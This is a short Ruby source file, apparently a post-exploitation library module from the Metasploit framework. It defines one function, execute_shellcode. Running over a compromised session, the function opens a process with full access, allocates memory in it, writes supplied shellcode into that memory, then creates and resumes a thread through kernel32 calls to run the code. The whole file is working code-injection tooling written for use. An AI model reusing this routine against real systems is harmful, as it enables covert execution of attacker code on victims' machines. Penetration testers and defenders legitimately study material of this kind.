# -*- coding: binary -*-

module Msf
class Post
module Windows

module Process

	##
	# execute_shellcode(shellcode, shell_addr)
	#
	# Summary:
	#   Injects shellcode to the a process, and executes it
	#
	# Parameters:
	#   shellcode - The shellcode to execute
	#   base_addr - Tha base address to allocate
	#   pid       - The process ID to inject to
	#
	# Returns:
	#   true if successful, otherwise false
	##
	def execute_shellcode(shellcode, base_addr, pid=nil)
		pid ||= session.sys.process.open.pid
		host  = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
		shell_addr = host.memory.allocate(shellcode.length, nil, base_addr)
		if host.memory.write(shell_addr, shellcode) < shellcode.length
			vprint_error("Failed to write shellcode")
			return false
		end

		vprint_status("Creating the thread to execute in 0x#{shell_addr.to_s(16)} (pid=#{pid.to_s})")
		ret = session.railgun.kernel32.CreateThread(nil, 0, shell_addr, nil, "CREATE_SUSPENDED", nil)
		if ret['return'] < 1
			vprint_error("Unable to CreateThread")
			return false
		end
		hthread = ret['return']

		vprint_status("Resuming the Thread...")
		ret = session.railgun.kernel32.ResumeThread(hthread)
		if ret['return'] < 1
			vprint_error("Unable to ResumeThread")
			return false
		end

		true
	end

end # Process
end # Windows
end # Post
end # Msf
